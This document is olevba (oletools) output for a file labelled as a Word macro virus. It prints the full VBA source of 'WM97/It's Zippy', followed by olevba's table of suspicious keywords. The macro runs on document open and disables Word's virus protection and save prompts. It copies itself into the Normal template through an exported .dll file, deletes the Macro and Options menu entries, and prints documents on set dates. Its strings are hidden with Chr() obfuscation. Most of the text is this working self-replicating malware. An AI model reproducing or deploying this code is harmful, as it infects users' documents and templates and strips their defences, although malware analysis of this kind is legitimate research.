olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.ay-77d416dfced20b0e57f8189011523543ab44dd47
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.ay-77d416dfced20b0e57f8189011523543ab44dd47 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

On Error GoTo zippy

Options.VirusProtection = Chr(48): Options.SaveNormalPrompt = Chr(48): Options.ConfirmConversions = Chr(48): jx = 0: xj = 1

rytx = ActiveDocument.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.countoflines

sytx = NormalTemplate.VBProject.VBComponents.Item(Cos(Atn(CInt(1)))).codemodule.countoflines

If sytx > Abs(jx) And rytx > Abs(jx) Then GoTo zippy

If sytx = Abs(jx) Then

    Set rylx = NormalTemplate.VBProject.VBComponents

    Set xhst = ActiveDocument.VBProject.VBComponents

    If Month(Now()) = 8 And Day(Now()) = 13 Then Application.ActiveDocument.PrintOut , , , "The Zippy Infection.vir"

    If Month(Now()) = 9 And Day(Now()) = 13 Then Application.ActiveDocument.PrintOut , , , "Virus says Hi.vir"

    If Month(Now()) = 10 And Day(Now()) = 13 Then Application.ActiveDocument.PrintOut , , , "Stop killing baby virii.vir"

    If Month(Now()) = 11 And Day(Now()) = 13 Then Application.ActiveDocument.PrintOut , , , "Zippy Zippy Zippy.vir"

    If Month(Now()) = 12 And Day(Now()) = 13 Then System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Document.8", "") = "It's Zippy!"
 
    xhst.Item(Cos(Atn(CInt(1)))).Name = rylx.Item(Cos(Atn(CInt(1)))).Name

    xhst.Item(Cos(Atn(CInt(1)))).Export Windows.Application.Path & Chr(46) + Chr(100) + Chr(108) + Chr(108)

End If

If rytx = Abs(jx) Then Set rylx = ActiveDocument.VBProject.VBComponents

rylx.Item(Cos(Atn(CInt(1)))).codemodule.AddFromFile Windows.Application.Path & Chr(46) + Chr(100) + Chr(108) + Chr(108)

With rylx.Item(Cos(Atn(CInt(1)))).codemodule

    For j = Chr(49) To Chr(52)

    .deletelines Chr(49)

        Next j

    End With

With rylx.Item(Cos(Atn(CInt(1)))).codemodule

For j = Chr(50) To 72 Step Chr(50)

    .replaceline j, Chr(39) & Application.DisplayRecentFiles & Application.Assistant & Application.FocusInMailHeader & Application.Build & Application.StartupPath & Application.ActiveDocument & Application.Version

    Next j

 End With

If sytx = Abs(jx) Then CommandBars(Chr(116) + Chr(111) + Chr(111) + Chr(108) + Chr(115)).Controls(Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111)).Delete

If sytx = Abs(jx) Then CommandBars(Chr(116) + Chr(111) + Chr(111) + Chr(108) + Chr(115)).Controls(Chr(79) + Chr(112) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(115) + Chr(46) + Chr(46) + Chr(46)).Delete

If sytx = Abs(jx) Then rylx.Item(Cos(Atn(CInt(1)))).codemodule.replaceline Abs(xj), "Sub AutoClose()"

If sytx = Abs(jx) And rytx = Abs(jx) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

zippy:

If sytx <> Abs(jx) And rytx = Abs(jx) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub

'WM97/It's Zippy by Virus
'                        (.)(.)
'                          (_
'                        \____/
'                            U  Smile, with a bit of class!
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+
